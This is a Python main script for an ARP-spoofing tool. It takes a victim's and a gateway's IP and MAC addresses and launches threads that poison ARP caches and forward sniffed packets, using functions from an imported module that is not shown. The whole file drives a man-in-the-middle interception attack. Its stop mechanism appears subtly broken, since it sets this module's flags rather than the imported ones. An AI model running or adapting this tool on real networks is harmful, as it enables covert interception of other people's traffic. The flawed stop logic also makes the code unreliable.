import argparse
import threading
from time import sleep
from include import spoofing, restore, set_1, set_2, packet_forwarding, stopFlag1, stopFlag2

def main():
    parser = argparse.ArgumentParser(description='python main.py [target ip], [target mac], [gateway ip], [gateway mac] [my ip] [my mac]')
    
    parser.add_argument('targetIp', type=str)
    parser.add_argument('targetMac', type=str)
    parser.add_argument('gatewayIp', type=str)
    parser.add_argument('gatewayMac', type=str)
    parser.add_argument('myIp', type=str)
    parser.add_argument('myMac', type=str)
    
    args = parser.parse_args()
    
    set_1(args.targetIp, args.targetMac, args.gatewayIp, args.gatewayMac, args.myIp, args.myMac)
    set_2(args.targetIp, args.targetMac, args.gatewayIp, args.gatewayMac, args.myIp, args.myMac)
    
    arpThread = threading.Thread(target=spoofing)
    arpThread.daemon = True
    
    sniffThread = threading.Thread(target=packet_forwarding)
    sniffThread.daemon = True
    
    arpThread.start()
    sniffThread.start()
    
    print('Packet sniffing start')
    print('enter "stop" if you want stop program')
    while(True):
        tmp = input()
        if(tmp == 'stop'):
            global stopFlag1, stopFlag2
            stopFlag1 = True
            stopFlag2 = True
            break
        
    restore()
    print('Packet sniffing stop')
    
    
    
if __name__ == '__main__':
    main()